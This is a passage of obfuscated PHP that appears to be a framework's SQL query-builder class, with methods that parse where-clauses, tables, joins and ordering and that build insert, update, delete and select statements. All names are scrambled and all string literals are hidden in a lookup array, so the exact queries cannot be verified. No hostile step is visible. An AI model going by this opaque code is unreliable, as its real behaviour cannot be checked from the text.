$this->bind[$_SERVER[ˆë€Ï⁄∂][4] . $¥≠ì£Ä∑] = $îÖ±»ß±; } protected function parseBind($∂õ÷◊îÚ) { $∂õ÷◊îÚ = array_merge($this->bind, $∂õ÷◊îÚ); $this->bind = array(); return $∂õ÷◊îÚ; } function parseKey(&$∑≠ÍÅüô, $Í˝êıﬁÆ = true) { if ($Í˝êıﬁÆ) { $∑≠ÍÅüô = $this->parseKeyCheck($∑≠ÍÅüô); } return $∑≠ÍÅüô; } function parseKeyCheck($ †ÊÚŒ≤) { $ÄßìâÙ =& $_SERVER[ˆë€Ï⁄∂]; $ †ÊÚŒ≤ = trim($ †ÊÚŒ≤); if (!preg_match($ÄßìâÙ[1088], $ †ÊÚŒ≤)) { think_exception($ÄßìâÙ[1089] . $ †ÊÚŒ≤); } return $ †ÊÚŒ≤; } protected function parseValue($ÈÛ⁄–≈É) { $˜˙ƒ‡ÈÓ =& $_SERVER[ˆë€Ï⁄∂]; if (is_string($ÈÛ⁄–≈É)) { $ÈÛ⁄–≈É = $˜˙ƒ‡ÈÓ[1049] . $this->escapeString($ÈÛ⁄–≈É) . $˜˙ƒ‡ÈÓ[1049]; } elseif (isset($ÈÛ⁄–≈É[0]) && is_string($ÈÛ⁄–≈É[0]) && strtolower($ÈÛ⁄–≈É[0]) == $˜˙ƒ‡ÈÓ[383]) { $ÈÛ⁄–≈É = $this->escapeString($ÈÛ⁄–≈É[1]); } elseif (is_array($ÈÛ⁄–≈É)) { $ÈÛ⁄–≈É = array_map(array($this, $˜˙ƒ‡ÈÓ[1050]), $ÈÛ⁄–≈É); } elseif (is_bool($ÈÛ⁄–≈É)) { $ÈÛ⁄–≈É = $ÈÛ⁄–≈É ? $˜˙ƒ‡ÈÓ[101] : $˜˙ƒ‡ÈÓ[240]; } elseif (is_null($ÈÛ⁄–≈É)) { $ÈÛ⁄–≈É = $˜˙ƒ‡ÈÓ[116]; } return $ÈÛ⁄–≈É; } protected function parseField($Á»ùüÖÉ) { $πá¨ıÓ˝ =& $_SERVER[ˆë€Ï⁄∂]; if (is_string($Á»ùüÖÉ) && strpos($Á»ùüÖÉ, $πá¨ıÓ˝[50])) { $Á»ùüÖÉ = explode($πá¨ıÓ˝[50], $Á»ùüÖÉ); } if (is_array($Á»ùüÖÉ)) { $Í‘˜Àıê = array(); foreach ($Á»ùüÖÉ as $ı¸˘˘˚ó => $Î≠å›’◊) { if (!is_numeric($ı¸˘˘˚ó)) { $Í‘˜Àıê[] = $this->parseKey($ı¸˘˘˚ó, !1) . $πá¨ıÓ˝[1090] . $this->parseKey($Î≠å›’◊); } else { $Í‘˜Àıê[] = $this->parseKey($Î≠å›’◊); } } $ÁƒêÉäΩ = implode($πá¨ıÓ˝[50], $Í‘˜Àıê); } elseif (is_string($Á»ùüÖÉ) && !empty($Á»ùüÖÉ)) { $ÁƒêÉäΩ = $Á»ùüÖÉ; } else { $ÁƒêÉäΩ = $πá¨ıÓ˝[232]; } return $ÁƒêÉäΩ; } protected function parseTable($ƒí•¿õ¿) { $ßÎΩ…Åì =& $_SERVER[ˆë€Ï⁄∂]; if (is_array($ƒí•¿õ¿)) { $ÏÇ£ˆ´ô = array(); foreach ($ƒí•¿õ¿ as $¶íÁÌõº => $–éüøœÛ) { if (!is_numeric($¶íÁÌõº)) { $ÏÇ£ˆ´ô[] = $this->parseKey($¶íÁÌõº) . $ßÎΩ…Åì[53] . $this->parseKey($–éüøœÛ); } else { $ÏÇ£ˆ´ô[] = $this->parseKey($¶íÁÌõº); } } $ƒí•¿õ¿ = $ÏÇ£ˆ´ô; } elseif (is_string($ƒí•¿õ¿)) { if (strstr($ƒí•¿õ¿, $ßÎΩ…Åì[53])) { return $ƒí•¿õ¿; } $ƒí•¿õ¿ = explode($ßÎΩ…Åì[50], $ƒí•¿õ¿); array_walk($ƒí•¿õ¿, array($this, $ßÎΩ…Åì[998])); } return $ßÎΩ…Åì[992] . trim(implode($ßÎΩ…Åì[1091], $ƒí•¿õ¿), $ßÎΩ…Åì[472]) . $ßÎΩ…Åì[992]; } protected function parseWhere($∏ﬂ»πÚ) { $ﬁÅÿÁÿ˝ =& $_SERVER[ˆë€Ï⁄∂]; $ºÈ÷ò‚Û = $ﬁÅÿÁÿ˝[12]; if (is_string($∏ﬂ»πÚ)) { $ºÈ÷ò‚Û = $∏ﬂ»πÚ; } else { $¶„éÈ˛ì = isset($∏ﬂ»πÚ[$ﬁÅÿÁÿ˝[1092]]) ? strtoupper($∏ﬂ»πÚ[$ﬁÅÿÁÿ˝[1092]]) : $ﬁÅÿÁÿ˝[12]; if (in_array($¶„éÈ˛ì, array($ﬁÅÿÁÿ˝[1093], $ﬁÅÿÁÿ˝[1094], $ﬁÅÿÁÿ˝[1095]))) { $¶„éÈ˛ì = $ﬁÅÿÁÿ˝[53] . $¶„éÈ˛ì . $ﬁÅÿÁÿ˝[53]; unset($∏ﬂ»πÚ[$ﬁÅÿÁÿ˝[1092]]); } else { $¶„éÈ˛ì = $ﬁÅÿÁÿ˝[1096]; } foreach ($∏ﬂ»πÚ as $ß˘üñ™‚ => $í÷È˝√ß) { $ºÈ÷ò‚Û .= $ﬁÅÿÁÿ˝[365]; if (is_numeric($ß˘üñ™‚)) { $ß˘üñ™‚ = $ﬁÅÿÁÿ˝[1097]; } if (0 === strpos($ß˘üñ™‚, $ﬁÅÿÁÿ˝[11])) { $ºÈ÷ò‚Û .= $this->parseThinkWhere($ß˘üñ™‚, $í÷È˝√ß); } else { if (!preg_match($ﬁÅÿÁÿ˝[1098], trim($ß˘üñ™‚))) { think_exception(think_lang($ﬁÅÿÁÿ˝[1099]) . $ﬁÅÿÁÿ˝[4] . $ß˘üñ™‚); } $µ˚±Éøî = is_array($í÷È˝√ß) && isset($í÷È˝√ß[$ﬁÅÿÁÿ˝[1100]]); $ß˘üñ™‚ = trim($ß˘üñ™‚); if (strpos($ß˘üñ™‚, $ﬁÅÿÁÿ˝[224])) { $ò€¿ß¶± = explode($ﬁÅÿÁÿ˝[224], $ß˘üñ™‚); $àñÒ°å¬ = array(); foreach ($ò€¿ß¶± as $¢Ø¬á”Å => $ì˘úÕ‰“) { $„≈‰Úƒ˘ = $µ˚±Éøî ? $í÷È˝√ß[$¢Ø¬á”Å] : $í÷È˝√ß; $àñÒ°å¬[] = $ﬁÅÿÁÿ˝[348] . $this->parseWhereItem($this->parseKey($ì˘úÕ‰“), $„≈‰Úƒ˘) . $ﬁÅÿÁÿ˝[997]; } $ºÈ÷ò‚Û .= implode($ﬁÅÿÁÿ˝[1101], $àñÒ°å¬); } elseif (strpos($ß˘üñ™‚, $ﬁÅÿÁÿ˝[296])) { $ò€¿ß¶± = explode($ﬁÅÿÁÿ˝[296], $ß˘üñ™‚); $àñÒ°å¬ = array(); foreach ($ò€¿ß¶± as $¢Ø¬á”Å => $ì˘úÕ‰“) { $„≈‰Úƒ˘ = $µ˚±Éøî ? $í÷È˝√ß[$¢Ø¬á”Å] : $í÷È˝√ß; $àñÒ°å¬[] = $ﬁÅÿÁÿ˝[348] . $this->parseWhereItem($this->parseKey($ì˘úÕ‰“), $„≈‰Úƒ˘) . $ﬁÅÿÁÿ˝[997]; } $ºÈ÷ò‚Û .= implode($ﬁÅÿÁÿ˝[1096], $àñÒ°å¬); } else { $ºÈ÷ò‚Û .= $this->parseWhereItem($this->parseKey($ß˘üñ™‚), $í÷È˝√ß); } } $ºÈ÷ò‚Û .= $ﬁÅÿÁÿ˝[366] . $¶„éÈ˛ì; } $ºÈ÷ò‚Û = substr($ºÈ÷ò‚Û, 0, -strlen($¶„éÈ˛ì)); } return empty($ºÈ÷ò‚Û) ? $ﬁÅÿÁÿ˝[12] : $ﬁÅÿÁÿ˝[1102] . $ºÈ÷ò‚Û; } protected function parseWhereItem($¨«Â™◊á, $Üäé∫¬Œ) { $≥≠Ë‹Õ‹ =& $_SERVER[ˆë€Ï⁄∂]; $Ç“âÙ◊û = $≥≠Ë‹Õ‹[12]; if (is_array($Üäé∫¬Œ)) { if (is_string($Üäé∫¬Œ[0])) { $Èâãê¨‡ = strtolower($Üäé∫¬Œ[0]); if (in_array($Üäé∫¬Œ[0], array($≥≠Ë‹Õ‹[517], $≥≠Ë‹Õ‹[1103], $≥≠Ë‹Õ‹[1104], $≥≠Ë‹Õ‹[1105], $≥≠Ë‹Õ‹[1106], $≥≠Ë‹Õ‹[1107]))) { $Ç“âÙ◊û .= $¨«Â™◊á . $≥≠Ë‹Õ‹[53] . $Üäé∫¬Œ[0] . $≥≠Ë‹Õ‹[53] . $this->parseValue($Üäé∫¬Œ[1]); } elseif (preg_match($≥≠Ë‹Õ‹[1108], $Üäé∫¬Œ[0])) { $Ç“âÙ◊û .= $¨«Â™◊á . $≥≠Ë‹Õ‹[53] . $this->exp[$Èâãê¨‡] . $≥≠Ë‹Õ‹[53] . $this->parseValue($Üäé∫¬Œ[1]); } elseif (preg_match($≥≠Ë‹Õ‹[1109], $Üäé∫¬Œ[0])) { if (is_array($Üäé∫¬Œ[1])) { $ﬁÄ˘ßûô = isset($Üäé∫¬Œ[2]) ? strtoupper($Üäé∫¬Œ[2]) : $≥≠Ë‹Õ‹[1094]; if (in_array($ﬁÄ˘ßûô, array($≥≠Ë‹Õ‹[1093], $≥≠Ë‹Õ‹[1094], $≥≠Ë‹Õ‹[1095]))) { $ì ¡ò¸£ = array(); foreach ($Üäé∫¬Œ[1] as $—ãÂû∏ ) { $ì ¡ò¸£[] = $¨«Â™◊á . $≥≠Ë‹Õ‹[53] . $this->exp[$Èâãê¨‡] . $≥≠Ë‹Õ‹[53] . $this->parseValue($—ãÂû∏ ); } $Ç“âÙ◊û .= $≥≠Ë‹Õ‹[348] . implode($≥≠Ë‹Õ‹[53] . $ﬁÄ˘ßûô . $≥≠Ë‹Õ‹[53], $ì ¡ò¸£) . $≥≠Ë‹Õ‹[997]; } } else { $Ç“âÙ◊û .= $¨«Â™◊á . $≥≠Ë‹Õ‹[53] . $this->exp[$Èâãê¨‡] . $≥≠Ë‹Õ‹[53] . $this->parseValue($Üäé∫¬Œ[1]); } } elseif ($≥≠Ë‹Õ‹[383] == $Èâãê¨‡) { $Ç“âÙ◊û .= $≥≠Ë‹Õ‹[995] . $¨«Â™◊á . $≥≠Ë‹Õ‹[53] . $Üäé∫¬Œ[1] . $≥≠Ë‹Õ‹[1110]; } elseif (preg_match($≥≠Ë‹Õ‹[1111], $Üäé∫¬Œ[0])) { $Ç“âÙ◊û .= $Üäé∫¬Œ[0]; } elseif (preg_match($≥≠Ë‹Õ‹[1112], $Üäé∫¬Œ[0])) { if (isset($Üäé∫¬Œ[2]) && $≥≠Ë‹Õ‹[383] == $Üäé∫¬Œ[2]) { $Ç“âÙ◊û .= $¨«Â™◊á . $≥≠Ë‹Õ‹[53] . $this->exp[$Èâãê¨‡] . $≥≠Ë‹Õ‹[53] . $Üäé∫¬Œ[1]; } else { if (is_string($Üäé∫¬Œ[1])) { $Üäé∫¬Œ[1] = explode($≥≠Ë‹Õ‹[50], $Üäé∫¬Œ[1]); } $‰˝ñ¢¯Ü = implode($≥≠Ë‹Õ‹[50], $this->parseValue($Üäé∫¬Œ[1])); $Ç“âÙ◊û .= $¨«Â™◊á . $≥≠Ë‹Õ‹[53] . $this->exp[$Èâãê¨‡] . $≥≠Ë‹Õ‹[995] . $‰˝ñ¢¯Ü . $≥≠Ë‹Õ‹[997]; } } elseif (preg_match($≥≠Ë‹Õ‹[1113], $Üäé∫¬Œ[0])) { $ÇÉÌºåŒ = is_string($Üäé∫¬Œ[1]) ? explode($≥≠Ë‹Õ‹[50], $Üäé∫¬Œ[1]) : $Üäé∫¬Œ[1]; $Ç“âÙ◊û .= $≥≠Ë‹Õ‹[995] . $¨«Â™◊á . $≥≠Ë‹Õ‹[53] . $this->exp[$Èâãê¨‡] . $≥≠Ë‹Õ‹[53] . $this->parseValue($ÇÉÌºåŒ[0]) . $≥≠Ë‹Õ‹[1096] . $this->parseValue($ÇÉÌºåŒ[1]) . $≥≠Ë‹Õ‹[366]; } else { think_exception(think_lang($≥≠Ë‹Õ‹[1099]) . $≥≠Ë‹Õ‹[4] . $Üäé∫¬Œ[0]); } } else { $Ô˙ïÄ°î = count($Üäé∫¬Œ); $∏˙∑î¯ = $≥≠Ë‹Õ‹[12]; if (is_string($Üäé∫¬Œ[$Ô˙ïÄ°î - 1])) { $∏˙∑î¯ = isset($Üäé∫¬Œ[$Ô˙ïÄ°î - 1]) ? strtoupper($Üäé∫¬Œ[$Ô˙ïÄ°î - 1]) : $≥≠Ë‹Õ‹[12]; if (in_array($∏˙∑î¯, array($≥≠Ë‹Õ‹[1093], $≥≠Ë‹Õ‹[1094], $≥≠Ë‹Õ‹[1095]))) { $Ô˙ïÄ°î = $Ô˙ïÄ°î - 1; } } else { $∏˙∑î¯ = $≥≠Ë‹Õ‹[1093]; } for ($ìÚä∂ﬂñ = 0; $ìÚä∂ﬂñ < $Ô˙ïÄ°î; $ìÚä∂ﬂñ++) { $ÇÉÌºåŒ = is_array($Üäé∫¬Œ[$ìÚä∂ﬂñ]) ? $Üäé∫¬Œ[$ìÚä∂ﬂñ][1] : $Üäé∫¬Œ[$ìÚä∂ﬂñ]; if ($≥≠Ë‹Õ‹[383] == strtolower($Üäé∫¬Œ[$ìÚä∂ﬂñ][0])) { $Ç“âÙ◊û .= $≥≠Ë‹Õ‹[348] . $¨«Â™◊á . $≥≠Ë‹Õ‹[53] . $ÇÉÌºåŒ . $≥≠Ë‹Õ‹[1110] . $∏˙∑î¯ . $≥≠Ë‹Õ‹[53]; } else { $‚“§Í•‡ = is_array($Üäé∫¬Œ[$ìÚä∂ﬂñ]) ? $this->exp[strtolower($Üäé∫¬Œ[$ìÚä∂ﬂñ][0])] : $≥≠Ë‹Õ‹[517]; if (!$‚“§Í•‡ && is_array($Üäé∫¬Œ[$ìÚä∂ﬂñ]) && in_array($Üäé∫¬Œ[$ìÚä∂ﬂñ][0], array($≥≠Ë‹Õ‹[517], $≥≠Ë‹Õ‹[1103], $≥≠Ë‹Õ‹[1104], $≥≠Ë‹Õ‹[1105], $≥≠Ë‹Õ‹[1106], $≥≠Ë‹Õ‹[1107]))) { $‚“§Í•‡ = $Üäé∫¬Œ[$ìÚä∂ﬂñ][0]; } $Ç“âÙ◊û .= $≥≠Ë‹Õ‹[348] . $¨«Â™◊á . $≥≠Ë‹Õ‹[53] . $‚“§Í•‡ . $≥≠Ë‹Õ‹[53] . $this->parseValue($ÇÉÌºåŒ) . $≥≠Ë‹Õ‹[1110] . $∏˙∑î¯ . $≥≠Ë‹Õ‹[53]; } } $Ç“âÙ◊û = substr($Ç“âÙ◊û, 0, -4); } } else { $Ç“âÙ◊û .= $¨«Â™◊á . $≥≠Ë‹Õ‹[1114] . $this->parseValue($Üäé∫¬Œ); } return $Ç“âÙ◊û; } protected function parseThinkWhere($Ìß„˛ﬁ≠, $À˘Éúï√) { $Ø™—„Ì∏ =& $_SERVER[ˆë€Ï⁄∂]; $©ı¸™Íº = $Ø™—„Ì∏[12]; switch ($Ìß„˛ﬁ≠) { case $Ø™—„Ì∏[438]: $©ı¸™Íº = $À˘Éúï√; break; case $Ø™—„Ì∏[1097]: $©ı¸™Íº = is_string($À˘Éúï√) ? $À˘Éúï√ : substr($this->parseWhere($À˘Éúï√), 6); break; case $Ø™—„Ì∏[1115]: parse_str($À˘Éúï√, $ëıá†©£); if (isset($ëıá†©£[$Ø™—„Ì∏[1092]])) { $∂ç˙ß£˜ = $Ø™—„Ì∏[53] . strtoupper($ëıá†©£[$Ø™—„Ì∏[1092]]) . $Ø™—„Ì∏[53]; unset($ëıá†©£[$Ø™—„Ì∏[1092]]); } else { $∂ç˙ß£˜ = $Ø™—„Ì∏[1096]; } $ï£â‘Ø¡ = array(); foreach ($ëıá†©£ as $¥òﬂ∫˜‰ => $Æ»±≥˛ë) { $ï£â‘Ø¡[] = $this->parseKey($¥òﬂ∫˜‰) . $Ø™—„Ì∏[1114] . $this->parseValue($Æ»±≥˛ë); } $©ı¸™Íº = implode($∂ç˙ß£˜, $ï£â‘Ø¡); break; } return $©ı¸™Íº; } protected function parseLimit($ÁçÁâÊ†) { $Æà™È»∆ =& $_SERVER[ˆë€Ï⁄∂]; return !empty($ÁçÁâÊ†) ? $Æà™È»∆[51] . $ÁçÁâÊ† . $Æà™È»∆[53] : $Æà™È»∆[12]; } protected function parseJoin($ÖÑ±›Œã) { $©é—ﬁêÊ =& $_SERVER[ˆë€Ï⁄∂]; $ﬂ ≈±ﬁÌ = $©é—ﬁêÊ[12]; if (!empty($ÖÑ±›Œã)) { if (is_array($ÖÑ±›Œã)) { foreach ($ÖÑ±›Œã as $‡¡›†ºê => $—Ã§∏ªß) { if (!1 !== stripos($—Ã§∏ªß, $©é—ﬁêÊ[1116])) { $ﬂ ≈±ﬁÌ .= $©é—ﬁêÊ[53] . $—Ã§∏ªß; } else { $ﬂ ≈±ﬁÌ .= $©é—ﬁêÊ[1117] . $—Ã§∏ªß; } } } else { $ﬂ ≈±ﬁÌ .= $©é—ﬁêÊ[1117] . $ÖÑ±›Œã; } } $ﬂ ≈±ﬁÌ = preg_replace($©é—ﬁêÊ[1118], think_config($©é—ﬁêÊ[1022]) . $©é—ﬁêÊ[1119], $ﬂ ≈±ﬁÌ); return $ﬂ ≈±ﬁÌ; } protected function parseOrder($«£∫ı¨Ä) { $Ã˘∆…Ω… =& $_SERVER[ˆë€Ï⁄∂]; if (is_array($«£∫ı¨Ä)) { $ãóı∂“⁄ = array(); foreach ($«£∫ı¨Ä as $°ÅæËÕÌ => $∑ÄÔœ£€) { if (is_numeric($°ÅæËÕÌ)) { $ãóı∂“⁄[] = $this->parseKey($∑ÄÔœ£€); } else { $∑ÄÔœ£€ = in_array(strtoupper(trim($∑ÄÔœ£€)), array($Ã˘∆…Ω…[1120], $Ã˘∆…Ω…[1121])) ? $Ã˘∆…Ω…[53] . $∑ÄÔœ£€ : $Ã˘∆…Ω…[12]; if (preg_match($Ã˘∆…Ω…[1122], $°ÅæËÕÌ)) { $ãóı∂“⁄[] = $this->parseKey($°ÅæËÕÌ) . $∑ÄÔœ£€; } else { think_exception($Ã˘∆…Ω…[1123] . $°ÅæËÕÌ); } } } $«£∫ı¨Ä = implode($Ã˘∆…Ω…[50], $ãóı∂“⁄); } return !empty($«£∫ı¨Ä) ? $Ã˘∆…Ω…[1124] . $«£∫ı¨Ä : $Ã˘∆…Ω…[12]; } protected function parseGroup($™ÄÿΩ≥ì) { $Â‘©˙ÚÈ =& $_SERVER[ˆë€Ï⁄∂]; return !empty($™ÄÿΩ≥ì) ? $Â‘©˙ÚÈ[1125] . $™ÄÿΩ≥ì : $Â‘©˙ÚÈ[12]; } protected function parseHaving($¸ƒ‡˚›Ω) { $“¢Ùÿü◊ =& $_SERVER[ˆë€Ï⁄∂]; return !empty($¸ƒ‡˚›Ω) ? $“¢Ùÿü◊[1126] . $¸ƒ‡˚›Ω : $“¢Ùÿü◊[12]; } protected function parseComment($©‚µÓ∂≠) { $‰æÂ°ïë =& $_SERVER[ˆë€Ï⁄∂]; return !empty($©‚µÓ∂≠) ? $‰æÂ°ïë[1127] . $©‚µÓ∂≠ . $‰æÂ°ïë[1128] : $‰æÂ°ïë[12]; } protected function parseDistinct($‚∑∞√ƒ°) { $ˆØèÃ∏Í =& $_SERVER[ˆë€Ï⁄∂]; return !empty($‚∑∞√ƒ°) ? $ˆØèÃ∏Í[1129] : $ˆØèÃ∏Í[12]; } protected function parseUnion($Ç ù«¿ƒ) { $Ù¯˚æÌµ =& $_SERVER[ˆë€Ï⁄∂]; if (empty($Ç ù«¿ƒ)) { return $Ù¯˚æÌµ[12]; } if (isset($Ç ù«¿ƒ[$Ù¯˚æÌµ[434]])) { $ó˘Ωªó˛ = $Ù¯˚æÌµ[1130]; unset($Ç ù«¿ƒ[$Ù¯˚æÌµ[434]]); } else { $ó˘Ωªó˛ = $Ù¯˚æÌµ[1131]; } foreach ($Ç ù«¿ƒ as $∆Û∂‰ôÔ) { $åÄ¨ﬁ±÷[] = $ó˘Ωªó˛ . (is_array($∆Û∂‰ôÔ) ? $this->buildSelectSql($∆Û∂‰ôÔ) : $∆Û∂‰ôÔ); } return implode($Ù¯˚æÌµ[53], $åÄ¨ﬁ±÷); } public function insert($Ã”ﬁÌËÛ, $¥”Û˜ıã = array(), $—ëå≤ÜÓ = false) { $“·ó‚§ã =& $_SERVER[ˆë€Ï⁄∂]; $˝≤˚ÀÜØ = $â ≥å˛› = array(); $this->model = $¥”Û˜ıã[$“·ó‚§ã[369]]; foreach ($Ã”ﬁÌËÛ as $Æÿ†Á‡  => $∑Æë‹æÑ) { if (is_array($∑Æë‹æÑ) && $“·ó‚§ã[383] == $∑Æë‹æÑ[0]) { $â ≥å˛›[] = $this->parseKey($Æÿ†Á‡ ); $˝≤˚ÀÜØ[] = $∑Æë‹æÑ[1]; } elseif (is_scalar($∑Æë‹æÑ) || is_null($∑Æë‹æÑ)) { $â ≥å˛›[] = $this->parseKey($Æÿ†Á‡ ); $˝≤˚ÀÜØ[] = $this->parseValue($∑Æë‹æÑ); } } $ø˜ïﬁå“ = ($—ëå≤ÜÓ ? $“·ó‚§ã[999] : $“·ó‚§ã[1000]) . $“·ó‚§ã[1001] . $this->parseTable($¥”Û˜ıã[$“·ó‚§ã[367]]) . $“·ó‚§ã[995] . implode($“·ó‚§ã[50], $â ≥å˛›) . $“·ó‚§ã[996] . implode($“·ó‚§ã[50], $˝≤˚ÀÜØ) . $“·ó‚§ã[997]; $ø˜ïﬁå“ .= $this->parseLock(isset($¥”Û˜ıã[$“·ó‚§ã[935]]) ? $¥”Û˜ıã[$“·ó‚§ã[935]] : !1); $ø˜ïﬁå“ .= $this->parseComment(!empty($¥”Û˜ıã[$“·ó‚§ã[440]]) ? $¥”Û˜ıã[$“·ó‚§ã[440]] : $“·ó‚§ã[12]); return $this->execute($ø˜ïﬁå“, $this->parseBind(!empty($¥”Û˜ıã[$“·ó‚§ã[371]]) ? $¥”Û˜ıã[$“·ó‚§ã[371]] : array())); } public function selectInsert($Äõ≤èíó, $ˆçü⁄∫¡, $ò√Ôíﬂ  = array()) { $˝Òç“ﬁ‡ =& $_SERVER[ˆë€Ï⁄∂]; $this->model = $ò√Ôíﬂ [$˝Òç“ﬁ‡[369]]; if (is_string($Äõ≤èíó)) { $Äõ≤èíó = explode($˝Òç“ﬁ‡[50], $Äõ≤èíó); } array_walk($Äõ≤èíó, array($this, $˝Òç“ﬁ‡[998])); $≥Á¸Ì√» = $˝Òç“ﬁ‡[1132] . $this->parseTable($ˆçü⁄∫¡) . $˝Òç“ﬁ‡[995] . implode($˝Òç“ﬁ‡[50], $Äõ≤èíó) . $˝Òç“ﬁ‡[1110]; $≥Á¸Ì√» .= $this->buildSelectSql($ò√Ôíﬂ ); return $this->execute($≥Á¸Ì√», $this->parseBind(!empty($ò√Ôíﬂ [$˝Òç“ﬁ‡[371]]) ? $ò√Ôíﬂ [$˝Òç“ﬁ‡[371]] : array())); } public function update($±ÈªÁ¡¸, $æô©„ë…) { $ã¿øŒö¥ =& $_SERVER[ˆë€Ï⁄∂]; $this->model = $æô©„ë…[$ã¿øŒö¥[369]]; $˜Ã∆áÄ˜ = $ã¿øŒö¥[1133] . $this->parseTable($æô©„ë…[$ã¿øŒö¥[367]]) . $this->parseSet($±ÈªÁ¡¸) . $this->parseWhere(!empty($æô©„ë…[$ã¿øŒö¥[363]]) ? $æô©„ë…[$ã¿øŒö¥[363]] : $ã¿øŒö¥[12]) . $this->parseOrder(!empty($æô©„ë…[$ã¿øŒö¥[452]]) ? $æô©„ë…[$ã¿øŒö¥[452]] : $ã¿øŒö¥[12]) . $this->parseLimit(!empty($æô©„ë…[$ã¿øŒö¥[378]]) ? $æô©„ë…[$ã¿øŒö¥[378]] : $ã¿øŒö¥[12]) . $this->parseLock(isset($æô©„ë…[$ã¿øŒö¥[935]]) ? $æô©„ë…[$ã¿øŒö¥[935]] : !1) . $this->parseComment(!empty($æô©„ë…[$ã¿øŒö¥[440]]) ? $æô©„ë…[$ã¿øŒö¥[440]] : $ã¿øŒö¥[12]); return $this->execute($˜Ã∆áÄ˜, $this->parseBind(!empty($æô©„ë…[$ã¿øŒö¥[371]]) ? $æô©„ë…[$ã¿øŒö¥[371]] : array())); } public function delete($‡ÏíÒºñ = array()) { $ˆææˆÎõ =& $_SERVER[ˆë€Ï⁄∂]; $this->model = $‡ÏíÒºñ[$ˆææˆÎõ[369]]; $î‰ˆ˙¯Ï = $ˆææˆÎõ[1134] . $this->parseTable($‡ÏíÒºñ[$ˆææˆÎõ[367]]) . $this->parseWhere(!empty($‡ÏíÒºñ[$ˆææˆÎõ[363]]) ? $‡ÏíÒºñ[$ˆææˆÎõ[363]] : $ˆææˆÎõ[12]) . $this->parseOrder(!empty($‡ÏíÒºñ[$ˆææˆÎõ[452]]) ? $‡ÏíÒºñ[$ˆææˆÎõ[452]] : $ˆææˆÎõ[12]) . $this->parseLimit(!empty($‡ÏíÒºñ[$ˆææˆÎõ[378]]) ? $‡ÏíÒºñ[$ˆææˆÎõ[378]] : $ˆææˆÎõ[12]) . $this->parseLock(isset($‡ÏíÒºñ[$ˆææˆÎõ[935]]) ? $‡ÏíÒºñ[$ˆææˆÎõ[935]] : !1) . $this->parseComment(!empty($‡ÏíÒºñ[$ˆææˆÎõ[440]]) ? $‡ÏíÒºñ[$ˆææˆÎõ[440]] : $ˆææˆÎõ[12]); return $this->execute($î‰ˆ˙¯Ï, $this->parseBind(!empty($‡ÏíÒºñ[$ˆææˆÎõ[371]]) ? $‡ÏíÒºñ[$ˆææˆÎõ[371]] : array())); } public function select($®åñ≤Òú = array()) { $Ω°ÆËŸ˘ =& $_SERVER[ˆë€Ï⁄∂]; $this->model = $®åñ≤Òú[$Ω°ÆËŸ˘[369]]; $∆ﬂèØÑá = $this->buildSelectSql($®åñ≤Òú); $€ÏåÄ˙õ = isset($®åñ≤Òú[$Ω°ÆËŸ˘[435]]) ? $®åñ≤Òú[$Ω°ÆËŸ˘[435]] : !1; if ($€ÏåÄ˙õ) { $ÃÔÖΩñÄ = is_string($€ÏåÄ˙õ[$Ω°ÆËŸ˘[107]]) ? $€ÏåÄ˙õ[$Ω°ÆËŸ˘[107]] : $Ω°ÆËŸ˘[1135] . md5($∆ﬂèØÑá); $ÈÙ¯ÉØµ = think_cache($ÃÔÖΩñÄ, $Ω°ÆËŸ˘[12], $€ÏåÄ˙õ); if (!1 !== $ÈÙ¯ÉØµ) { return $ÈÙ¯ÉØµ; } } $íñÃ†ï = $this->query($∆ﬂèØÑá, $this->parseBind(!empty($®åñ≤Òú[$Ω°ÆËŸ˘[371]]) ? $®åñ≤Òú[$Ω°ÆËŸ˘[371]] : array())); if ($€ÏåÄ˙õ && !1 !== $íñÃ†ï) { think_cache($ÃÔÖΩñÄ, $íñÃ†ï, $€ÏåÄ˙õ); } return $íñÃ†ï; } public function buildSelectSql($°·¥õÇÓ = array()) { $ª˜øå–å =& $_SERVER[ˆë€Ï⁄∂]; if (isset($°·¥õÇÓ[$ª˜øå–å[439]])) { if (strpos($°·¥õÇÓ[$ª˜øå–å[439]], $ª˜øå–å[50])) { list($Ää˚◊ ø, $íΩ¢À»°) = explode($ª˜øå–å[50], $°·¥õÇÓ[$ª˜øå–å[439]]); } else { $Ää˚◊ ø = $°·¥õÇÓ[$ª˜øå–å[439]]; } $Ää˚◊ ø = $Ää˚◊ ø ? $Ää˚◊ ø : 1; $íΩ¢À»° = isset($íΩ¢À»°) ? $íΩ¢À»° : (is_numeric($°·¥õÇÓ[$ª˜øå–å[378]]) ? $°·¥õÇÓ[$ª˜øå–å[378]] : 20); $îåÄ¯ﬂí = $íΩ¢À»° * ((int) $Ää˚◊ ø - 1); $°·¥õÇÓ[$ª˜øå–å[378]] = $îåÄ¯ﬂí . $ª˜øå–å[50] . $íΩ¢À»°; } if (think_config($ª˜øå–å[1136])) { $ñèçÈÈﬁ = $ª˜øå–å[1137] . md5(serialize($°·¥õÇÓ)); $ò≥™ìò° = think_cache($ñèçÈÈﬁ); if ($ò≥™ìò°) { return $ò≥™ìò°; } } $¬è≤Ï»Ü = $this->parseSql($this->selectSql, $°·¥õÇÓ); $¬è≤Ï»Ü .= $this->parseLock(isset($°·¥õÇÓ[$ª˜øå–å[935]]) ? $°·¥õÇÓ[$ª˜øå–å[935]] : !1); if (isset($ñèçÈÈﬁ)) { think_cache($ñèçÈÈﬁ, $¬è≤Ï»Ü); } return $¬è≤Ï»Ü; } public function parseSql($ıæÇ±‡°, $˙Èﬂ…Ïê = array()) { $°ÃÍÄ˘â =& $_SERVER[ˆë€Ï⁄∂]; $ıæÇ±‡° = str_replace(array($°ÃÍÄ˘â[1138], $°ÃÍÄ˘â[1139], $°ÃÍÄ˘â[1140], $°ÃÍÄ˘â[1141], $°ÃÍÄ˘â[1142], $°ÃÍÄ˘â[1143], $°ÃÍÄ˘â[1144], $°ÃÍÄ˘â[1145], $°ÃÍÄ˘â[1146], $°ÃÍÄ˘â[1147], $°ÃÍÄ˘â[1148]), array($this->parseTable("{$˙Èﬂ…Ïê[$°ÃÍÄ˘â[367]]}"), $this->parseDistinct(isset($˙Èﬂ…Ïê[$°ÃÍÄ˘â[1149]]) ? $˙Èﬂ…Ïê[$°ÃÍÄ˘â[1149]] : !1), $this->parseField(!empty($˙Èﬂ…Ïê[$°ÃÍÄ˘â[361]]) ? $˙Èﬂ…Ïê[$°ÃÍÄ˘â[361]] : $°ÃÍÄ˘â[232]), $this->parseJoin(!empty($˙Èﬂ…Ïê[$°ÃÍÄ˘â[370]]) ? $˙Èﬂ…Ïê[$°ÃÍÄ˘â[370]] : 